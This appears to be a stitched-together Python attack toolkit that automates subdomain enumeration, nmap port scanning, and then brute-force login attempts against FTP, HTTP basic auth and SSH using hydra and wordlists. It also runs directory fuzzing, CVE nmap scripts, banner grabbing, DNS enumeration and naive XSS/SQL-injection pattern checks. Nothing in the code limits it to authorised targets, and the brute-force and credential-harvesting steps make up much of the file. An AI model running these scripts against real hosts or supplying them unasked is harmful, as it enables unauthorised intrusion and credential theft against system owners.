import subprocess
import time
import re
import nmap






#    ,__                   __
#    '~~****Nm_    _mZ*****~~
#            _8@mm@K_
#           W~@`  '@~W
#          ][][    ][][
#    gz    'W'W.  ,W`W`    es
#  ,Wf    gZ****MA****Ns    VW.
# gA`   ,Wf     ][     VW.   'Ms
#Wf    ,@`      ][      '@.    VW
#M.    W`  _mm_ ][ _mm_  'W    ,A
#'W   ][  i@@@@i][i@@@@i  ][   W`
# !b  @   !@@@@!][!@@@@!   @  d!
# VWmP    ~**~ ][ ~**~    YmWf
#    ][         ][         ][
#  ,mW[         ][         ]Wm.
# ,A` @  ,gms.  ][  ,gms.  @ 'M.
# W`  Yi W@@@W  ][  W@@@W iP  'W
#d!   'W M@@@A  ][  M@@@A W`   !b
#@.    !b'V*f`  ][  'V*f`d!    ,@
#'Ms    VW.     ][     ,Wf    gA`
#  VW.   'Ms.   ][   ,gA`   ,Wf
#   'Ms    'V*mmWWmm*f`    gA`









scanned_subdomains = set()

def run_command(command):
    process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    output, _ = process.communicate()
    return output.decode()

def scan_command_with_delay(command):
    run_command(f'gnome-terminal -- bash -c "{command}; echo scan completed; sleep 5"')

def is_domain_or_ip(subdomain):
    if subdomain.endswith('.com') or re.match(r'\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b', subdomain):
        return True
    return False

def scan_subdomains(subdomains):
    for subdomain in subdomains:
        if subdomain not in scanned_subdomains and is_domain_or_ip(subdomain):
            print(f"Scanning subdomain: {subdomain}")
            commands = [
                f"amass enum -d {subdomain} | tee -a scan_results2.txt",
                f"subfinder -d {subdomain} | tee -a scan_results2.txt",
                f"assetfinder --subs-only {subdomain} | tee -a scan_results2.txt"
            ]
            for command in commands:
                scan_command_with_delay(command)
                time.sleep(20)
            scanned_subdomains.add(subdomain)

def branch1(target):
    commands = [
        f"amass enum -d {target} | tee -a scan_results.txt",
        f"subfinder -d {target} | tee -a scan_results.txt",
        f"assetfinder --subs-only {target} | tee -a scan_results.txt"
    ]
    for command in commands:
        scan_command_with_delay(command)
        time.sleep(30)

def scan_com_domains(com_domains, filename="scan_results.txt"):
    for domain in com_domains:
        print(f"Scanning domain: {domain}")
        commands = [
            f"amass enum -d {domain} -o | tee -a scan_results2.txt",
            f"subfinder -d {domain} | tee -a scan_results2.txt",
            f"assetfinder --subs-only {domain} | tee -a scan_results2.txt"
        ]
        for command in commands:
            scan_command_with_delay(command)
            time.sleep(30)

def nmap_scan(domain):
    try:
        nm = nmap.PortScanner()
        nm.scan(domain, arguments='-p 1-1000')
        with open('ports.txt', 'a') as file:
            for host in nm.all_hosts():
                for proto in nm[host].all_protocols():
                    lport = nm[host][proto].keys()
                    for port in lport:
                        file.write(f"{host};{domain};{proto};{port};{nm[host][proto][port]['name']};{nm[host][proto][port]['state']}\n")
    except Exception as e:
        print(f"An error occurred while scanning domain {domain}: {e}")

def mainloopportrecon(filename, filename2):
    try:
        with open(filename, 'r') as file:
            domains = file.readlines()
            for domain in domains:
                domain = domain.strip()
                print(f"Scanning domain: {domain}")
                nmap_scan(domain)
    except Exception as e:
        print(f"An error occurred while reading the file: {e}")



if __name__ == "__main__":
    target_host = ".com" #<---------------------------------------------------------------.-.-.-.-.-.-.-.-..-.-......
    branch1(target_host)
    time.sleep(30)
    com_domains = []
    with open("scan_results.txt", "r") as file:
        for line in file:
            if line.strip().endswith(".com"):
                com_domains.append(line.strip())
    scan_com_domains(com_domains)
    time.sleep(20 * len(com_domains))
    mainloopportrecon('scan_results.txt', 'scan_results2.txt')











def remove_non_numeric_chars(filename):
    cleaned_data = []
    with open(filename, 'r') as file:
        for line in file:
            cleaned_line = ''.join(char for char in line if char.isdigit() or char == '.')
            # Replace consecutive dots with a single semicolon
            cleaned_line = cleaned_line.replace('..', ';')
            # Remove consecutive semicolons
            cleaned_line = remove_consecutive_semicolons(cleaned_line)
            cleaned_data.append(cleaned_line)
    return cleaned_data

def remove_consecutive_semicolons(line):
    # Replace consecutive semicolons with a single semicolon
    return ';'.join(filter(None, line.split(';')))

def save_cleaned_data(data, output_filename):
    with open(output_filename, 'w') as output_file:
        for line in data:
            output_file.write(line + '\n')

if __name__ == "__main__":
    input_filename = 'ports.txt'
    output_filename = 'cleaned_ports.txt'
    cleaned_data = remove_non_numeric_chars(input_filename)
    save_cleaned_data(cleaned_data, output_filename)
    print("Data cleaned and saved to 'cleaned_ports.txt'.")











import socket
from ftplib import FTP, error_perm

def check_ftp(ip_address, port, output_file):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(5)
            s.connect((ip_address, port))
            output_file.write(f"FTP access available on {ip_address}:{port}\n")
            return True
    except Exception as e:
        output_file.write(f"FTP access not available on {ip_address}:{port}. Error: {e}\n")
        return False

def bypass_ftp_authentication(ip_address, port, username_list, password_list, output_file):
    with open(username_list, 'r') as user_file, open(password_list, 'r') as pass_file:
        usernames = user_file.read().splitlines()
        passwords = pass_file.read().splitlines()

    for username in usernames:
        for password in passwords:
            try:
                ftp = FTP()
                ftp.connect(ip_address, port, timeout=5)
                ftp.login(username, password)
                output_file.write(f"Valid credentials found - IP: {ip_address}, Port: {port}, Username: {username}, Password: {password}\n")
                ftp.quit()
                return
            except error_perm:
                output_file.write(f"Invalid credentials - IP: {ip_address}, Port: {port}, Username: {username}, Password: {password}\n")
            except Exception as e:
                output_file.write(f"Error attempting login - IP: {ip_address}, Port: {port}, Username: {username}, Password: {password}. Error: {e}\n")

if __name__ == "__main__":
    username_list = 'usernames.txt'
    password_list = 'passwords.txt'
    
    with open('cleaned_ports.txt', 'r') as file:
        with open('ftp_results.txt', 'w') as output_file:
            for line in file:
                parts = line.strip().split(';')
                if len(parts) >= 2:
                    ip_address = parts[0]
                    port_str = parts[1]
                    if port_str.isdigit():
                        port = int(port_str)
                        output_file.write(f"Checking FTP access on {ip_address}:{port}\n")
                        if port == 21:  # Only check FTP on the default FTP port
                            if check_ftp(ip_address, port, output_file):
                                output_file.write(f"Attempting to bypass FTP authentication on {ip_address}:{port}\n")
                                bypass_ftp_authentication(ip_address, port, username_list, password_list, output_file)
                        else:
                            output_file.write(f"Skipping non-FTP port {port} for IP {ip_address}\n")
                    else:
                        output_file.write(f"Skipping line: Invalid port number - {port_str}\n")
                else:
                    output_file.write("Skipping line: Insufficient data\n")









import subprocess
import re

def perform_dirsearch_scan(filename):
    try:
        with open(filename, 'r') as file:
            lines = file.readlines()
            for line in lines:
                try:
                    ip, port = line.strip().split(';')
                except ValueError:
                    print(f"Issue with formatting in line: {line.strip()}. Skipping...")
                    continue

                command = f'dirsearch -u http://{ip}:{port} -e *'
                try:
                    result = subprocess.run(command, shell=True, check=True, text=True, capture_output=True)
                    output = result.stdout
                    
                    print(f"Results for IP: {ip}, Port: {port}")
                    found_urls = re.findall(r'\[200\] ([^\s]+)', output)
                    
                    if found_urls:
                        print("Found URLs:")
                        for url in found_urls:
                            print(url)
                            with open('dirsearch_results.txt', 'a') as result_file:
                                result_file.write(f"Found URL: {url}\n")
                    else:
                        print("No URLs found.")
                except subprocess.CalledProcessError as e:
                    print(f"Error occurred while scanning {ip} on port {port}: {e}")
                    with open('dirsearch_results.txt', 'a') as result_file:
                        result_file.write(f"Error occurred while scanning {ip} on port {port}: {e}\n")
    except Exception as e:
        print(f"An error occurred while reading the file: {e}")

# Example usage:
perform_dirsearch_scan('cleaned_ports.txt')











import threading
import subprocess
import time
import logging
import re

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s', handlers=[
    logging.FileHandler('hydra_results.txt'),
    logging.StreamHandler()
])

def parse_hydra_output(output):
    # Regular expression to find the valid username and password pair
    match = re.search(r'\[80\]\[http-get\] host: ([\d\.]+)\s+login: (\w+)\s+password: (\w+)', output)
    if match:
        ip = match.group(1)
        username = match.group(2)
        password = match.group(3)
        return ip, username, password
    return None, None, None

def bypass_authentication(ip_address, username_list, password_list, protected_resource):
    command = f"hydra -L {username_list} -P {password_list} -t 4 -T 4 -f {ip_address} http-get /{protected_resource}"
    try:
        logging.info(f"Starting Hydra for IP: {ip_address}")
        result = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        
        # Log both stdout and stderr
        if result.stdout:
            logging.info(f"\n--- Hydra Output for {ip_address} ---\n{result.stdout}\n--- End of Output ---")
        if result.stderr:
            logging.error(f"\n--- Hydra Error for {ip_address} ---\n{result.stderr}\n--- End of Error ---")

        # Parse and log the valid username and password pair
        ip, username, password = parse_hydra_output(result.stdout)
        if ip and username and password:
            logging.info(f"\n--- Valid Credentials Found ---\nIP: {ip}\nUsername: {username}\nPassword: {password}\n--- End of Credentials ---")

    except Exception as e:
        logging.error(f"\nAn error occurred while bypassing authentication on {ip_address}: {e}\n")

def main():
    threads = []
    with open('ports.txt', 'r') as file:
        for line in file:
            ip_address, *_ = line.strip().split(';')
            t = threading.Thread(target=bypass_authentication, args=(ip_address, 'usernames.txt', 'passwords.txt', 'protected_resource.txt'))
            threads.append(t)
            t.start()

            # Limit the number of concurrent threads to avoid overwhelming the system
            if len(threads) >= 5:
                for t in threads:
                    t.join()
                threads = []

                # Adding delay to prevent too many connection errors
                time.sleep(5)

    # Join any remaining threads
    for t in threads:
        t.join()

if __name__ == "__main__":
    main()










import subprocess

def enumerate_directories(ip_address, port, output_file):
    wordlist = "/home/kali/wordlist.txt"
    command = f"wfuzz -c --hc 404,403 -w {wordlist} http://{ip_address}:{port}/FUZZ"
    print(f"Enumerating directories on {ip_address}:{port}")
    try:
        result = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, timeout=30)
        output_file.write(f"Results for {ip_address}:{port}:\n")
        output_file.write(result.stdout)
        output_file.write(result.stderr)
        print(f"Enumeration completed for {ip_address}:{port}")
    except subprocess.TimeoutExpired:
        print(f"Directory enumeration on {ip_address}:{port} timed out")
        output_file.write(f"Directory enumeration on {ip_address}:{port} timed out\n")

if __name__ == "__main__":
    with open('cleaned_ports.txt', 'r') as file:
        with open('directory_results.txt', 'w') as output_file:
            for line in file:
                parts = line.strip().split(';')
                if len(parts) >= 2:
                    ip_address = parts[0]
                    port_str = parts[1]
                    if port_str.isdigit():
                        port = int(port_str)
                        enumerate_directories(ip_address, port, output_file)
                    else:
                        print(f"Skipping line: Invalid port number - {port_str}")
                        output_file.write(f"Skipping line: Invalid port number - {port_str}\n")
                else:
                    print("Skipping line: Insufficient data")
                    output_file.write("Skipping line: Insufficient data\n")









#ssh brute force needs work
import subprocess
import datetime

def brute_force_ssh(ip_address, username_list, password_list):
    log_file = 'ssh_results.log'
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    command = f"hydra -L {username_list} -P {password_list} ssh://{ip_address} -t 4 -v"
    
    try:
        with open(log_file, 'a') as log:
            log.write(f"\n\n{timestamp} - Starting brute force attack on {ip_address}\n")
            result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=300)
            log.write(result.stdout)
            log.write(result.stderr)
            print(result.stdout)
    except subprocess.TimeoutExpired:
        with open(log_file, 'a') as log:
            log.write(f"\n\n{timestamp} - Timeout occurred while brute forcing SSH on {ip_address}\n")
            print(f"Timeout occurred while brute forcing SSH on {ip_address}")
    except Exception as e:
        with open(log_file, 'a') as log:
            log.write(f"\n\n{timestamp} - An error occurred while brute forcing SSH on {ip_address}: {str(e)}\n")
            print(f"An error occurred while brute forcing SSH on {ip_address}: {str(e)}")

def main():
    username_list_path = '/home/kali/usernames.txt'  # Replace this with the actual path to your username list file
    password_list_path = '/home/kali/passwords.txt'  # Replace this with the actual path to your password list file

    with open('ports.txt', 'r') as file:
        for line in file:
            ip_address, *_ = line.strip().split(';')
            brute_force_ssh(ip_address, username_list_path, password_list_path)

if __name__ == "__main__":
    main()









import subprocess

def check_for_outdated_versions(filename):
    try:
        with open(filename, 'r') as file:
            lines = file.readlines()
            for line in lines:
                ip, port = line.strip().split(';')
                command = f'nmap -p {port} --script http-vuln-cve2010-2861 {ip}'
                try:
                    output = subprocess.check_output(command, shell=True, text=True)
                    if "443/tcp open  https" in output or "80/tcp open  http" in output:
                        if "Host is up" in output and "Nmap scan report" in output:
                            print(f"Outdated version found for IP: {ip}, Port: {port}")
                except subprocess.CalledProcessError as e:
                    print(f"Error occurred while scanning {ip} on port {port}: {e}")
    except Exception as e:
        print(f"An error occurred while reading the file: {e}")

# Example usage:
check_for_outdated_versions('cleaned_ports.txt')



















import dns.resolver
import dns.reversename
import logging
import subprocess

def ans_lookup(ip_address):
    try:
        rev_name = dns.reversename.from_address(ip_address)
        domain_name = str(dns.resolver.resolve(rev_name, "PTR")[0])
        print(f"Domain name for IP {ip_address}: {domain_name}")

        try:
            ns_records = dns.resolver.resolve(domain_name, "NS")
            ans_list = [str(ns_record) for ns_record in ns_records]
            return domain_name, ans_list
        except dns.resolver.NoAnswer:
            return domain_name, []
    except Exception as e:
        return None, None

def check_vulnerabilities(ip_address, port):
    try:
        command = f"nmap -p {port} --script http-vuln-cve2010-2861,http-vuln-cve2014-3704,http-vuln-cve2015-1635,http-vuln-cve2017-5638 {ip_address}"
        output = subprocess.check_output(command, shell=True, text=True)
        if "VULNERABLE" in output:
            return output
        return None
    except subprocess.CalledProcessError as e:
        return None

def main():
    logging.basicConfig(filename='ansresults.txt', level=logging.INFO, format='%(message)s')

    try:
        with open('cleaned_ports.txt', 'r') as file:
            lines = file.readlines()
            for line in lines:
                try:
                    ip_address, port = line.strip().split(';')
                    if not port.isdigit():
                        continue
                    port = int(port)

                    domain_name, ans_list = ans_lookup(ip_address)
                    if domain_name and ans_list:
                        log_message = f"Domain name: {domain_name}, IP: {ip_address}, ANS: {', '.join(ans_list)}"
                        logging.info(log_message)
                        print(log_message)

                    vuln_output = check_vulnerabilities(ip_address, port)
                    if vuln_output:
                        logging.info(f"Vulnerabilities found for {ip_address}:{port}\n{vuln_output}")
                        print(f"Vulnerabilities found for {ip_address}:{port}\n{vuln_output}")
                except ValueError:
                    continue
    except Exception as e:
        print(f"An error occurred while reading the file: {e}")

if __name__ == "__main__":
    main()











import socket

def banner_grabbing(ip, port, result_file):
    try:
        # Create a socket object
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        
        # Set a timeout for the connection
        s.settimeout(5)

        # Connect to the IP and port
        s.connect((ip, port))
        
        # Send an empty request to get a response
        s.send(b'HEAD / HTTP/1.0\r\n\r\n')
        
        # Receive the banner
        banner = s.recv(1024).decode().strip()
        
        # Print the banner with better formatting
        if banner:
            banner_info = f"\n==== Banner for {ip}:{port} ====\n{banner}\n==== End of Banner ====\n"
            print(banner_info)
            
            # Write the banner to the results file
            with open(result_file, "a") as file:
                file.write(banner_info)

        # Close the socket
        s.close()

    except Exception as e:
        error_info = f"Error occurred while connecting to {ip}:{port}: {e}"
        print(error_info)
        
        # Write the error to the results file
        with open(result_file, "a") as file:
            file.write(error_info + "\n")

def detect_technologies(filename, result_file):
    try:
        with open(filename, 'r') as file:
            for line in file:
                parts = line.strip().split(';')
                if len(parts) == 2:
                    ip = parts[0]
                    try:
                        port = int(parts[1])
                        banner_grabbing(ip, port, result_file)
                    except ValueError:
                        error_info = f"Invalid port value in line: {line.strip()}"
                        print(error_info)
                        
                        # Write the error to the results file
                        with open(result_file, "a") as file:
                            file.write(error_info + "\n")
                else:
                    error_info = f"Invalid line format: {line.strip()}"
                    print(error_info)
                    
                    # Write the error to the results file
                    with open(result_file, "a") as file:
                        file.write(error_info + "\n")

    except Exception as e:
        error_info = f"An error occurred while reading the file: {e}"
        print(error_info)
        
        # Write the error to the results file
        with open(result_file, "a") as file:
            file.write(error_info + "\n")

# Example usage
detect_technologies('cleaned_ports.txt', 'banner_results.txt')











#further dns enumeration
import os
import subprocess

def run_command(command):
    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=60)
        return result.stdout
    except subprocess.TimeoutExpired:
        return f"Error: Command timed out: {command}"
    except Exception as e:
        return f"Error running command {command}: {e}"

def dns_enumeration(domain, result_file):
    commands = {
        "dnsenum": f"dnsenum {domain}",
        "dig": f"dig {domain}",
        "fierce": f"fierce --domain {domain}",
        "dnsrecon": f"dnsrecon -d {domain}",
        "massdns": f"massdns -r resolvers.txt -t A -o S {domain}",
        "dnsmap": f"dnsmap {domain}",
        "dnscan": f"dnscan -d {domain}"
    }

    with open(result_file, "a") as file:
        for tool, command in commands.items():
            file.write(f"\n==== {tool} Results for {domain} ====\n")
            file.write(f"Running: {command}\n")
            output = run_command(command)
            file.write(output)
            file.write(f"\n==== End of {tool} Results ====\n")
            print(f"{tool} completed for {domain}")

def process_domains(filenames, result_file):
    domains = set()

    for filename in filenames:
        try:
            with open(filename, 'r') as file:
                for line in file:
                    domain = line.strip()
                    if domain:
                        domains.add(domain)
        except Exception as e:
            print(f"Error reading file {filename}: {e}")

    with open(result_file, "w") as file:
        file.write("DNS Enumeration Results\n")
        file.write("========================\n\n")

    for domain in domains:
        print(f"Starting DNS enumeration for {domain}")
        dns_enumeration(domain, result_file)
        print(f"Completed DNS enumeration for {domain}")

# Example usage
domain_files = ['scan_results.txt', 'scan_results2.txt']
process_domains(domain_files, 'dns_results.txt')













import subprocess
import re

def run_curl(target, output_file):
    try:
        # Run Curl command to perform HTTP request
        result = subprocess.run(['curl', '-I', '-s', target], capture_output=True, text=True)
        headers = result.stdout

        result = subprocess.run(['curl', '-s', target], capture_output=True, text=True)
        body = result.stdout

        # Check for XSS vulnerabilities
        xss_patterns = ['<script>', 'onmouseover=', 'alert\(', 'javascript:']
        xss_vulnerabilities = []
        for pattern in xss_patterns:
            if re.search(pattern, body, re.IGNORECASE) or re.search(pattern, headers, re.IGNORECASE):
                xss_vulnerabilities.append(pattern)

        # Check for SQL injection vulnerabilities
        sql_patterns = ['SQL syntax', 'syntax error', 'mysql_fetch_array', 'mysql_fetch_assoc',
                        'mysqli_query', 'mysql_query', 'mysql_error', 'mysql_connect']
        sql_vulnerabilities = []
        for pattern in sql_patterns:
            if re.search(pattern, body, re.IGNORECASE) or re.search(pattern, headers, re.IGNORECASE):
                sql_vulnerabilities.append(pattern)

        # Check for other common vulnerabilities
        other_vulnerabilities = []
        if 'phpinfo()' in body or 'phpinfo()' in headers:
            other_vulnerabilities.append('phpinfo()')
        if 'eval\(' in body or 'eval\(' in headers:
            other_vulnerabilities.append('eval()')

        # Write vulnerabilities to file
        with open(output_file, 'a') as file:
            file.write(f"\n==== Vulnerabilities found for {target} ====\n")
            if xss_vulnerabilities:
                file.write("XSS vulnerabilities found:\n")
                for xss in xss_vulnerabilities:
                    file.write(f"- {xss}\n")
            if sql_vulnerabilities:
                file.write("SQL injection vulnerabilities found:\n")
                for sql in sql_vulnerabilities:
                    file.write(f"- {sql}\n")
            if other_vulnerabilities:
                file.write("Other vulnerabilities found:\n")
                for other in other_vulnerabilities:
                    file.write(f"- {other}\n")
            if not xss_vulnerabilities and not sql_vulnerabilities and not other_vulnerabilities:
                file.write("No vulnerabilities found\n")
            file.write("==== End of Vulnerabilities ====\n")
    except Exception as e:
        print(f"Error running Curl for {target}: {e}")

def process_targets(target_files, output_file):
    for filename in target_files:
        try:
            with open(filename, 'r') as file:
                for line in file:
                    target = line.strip()
                    if target:
                        run_curl(target, output_file)
        except Exception as e:
            print(f"Error reading file {filename}: {e}")

# List of target files
target_files = ['cleaned_ports.txt', 'scan_results.txt', 'scan_results2.txt']

# Output file
output_file = 'curl_results.txt'

# Process targets and write results to output file
process_targets(target_files, output_file)











import subprocess

def run_whatweb(domain, output_file):
    subprocess.run(['whatweb', domain, '-v'], stdout=output_file, stderr=subprocess.DEVNULL)

def process_domains(domain_files, output_file):
    for filename in domain_files:
        with open(filename, 'r') as file:
            for domain in file:
                domain = domain.strip()
                if domain:
                    with open(output_file, 'a') as out:
                        run_whatweb(domain, out)

# List of domain files
domain_files = ['scan_results.txt', 'scan_results2.txt']

# Output file
output_file = 'whatweb_results.txt'

# Process domains and write results to output file
process_domains(domain_files, output_file)
















